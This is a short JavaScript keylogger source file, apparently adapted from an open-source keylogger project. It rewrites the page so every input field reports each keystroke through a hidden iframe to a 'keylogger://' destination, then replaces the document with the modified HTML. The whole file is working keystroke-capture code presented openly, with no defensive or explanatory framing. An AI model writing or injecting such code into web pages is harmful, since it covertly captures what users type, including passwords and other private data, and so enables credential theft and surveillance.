// Based on http://code.google.com/p/javascript-keylogger/source/browse/trunk/JavascriptKeylogger/keylogger.js?r=3

var destination = 'keylogger://';

var keyPressScript = '<script>' +
	'function relayKeyPress(e) {' +
	'var fc = document.getElementById("frameContainer");' +
	'var x = String.fromCharCode(e.keyCode);' +
	'var y = String.fromCharCode(e.which);' +
	'var k = e.keyCode ? x : y;' +
	'var f = \'' + destination + '\' + escape(k);' +
	'fc.src = f;' +
	'};' +
	'</script>';

var iframe = '<iframe id="frameContainer" style="display:none;"></iframe>';

var html = document.getElementsByTagName('html')[0].innerHTML;

html = html.replace(/<head[^>]*>/i, '<head>' + keyPressScript);
html = html.replace(/<body[^>]*>/i, '<body>' + iframe);
html = html.replace(/<input/gi, '<input onkeypress="relayKeyPress(event)" ');

document.clear();
document.write(html);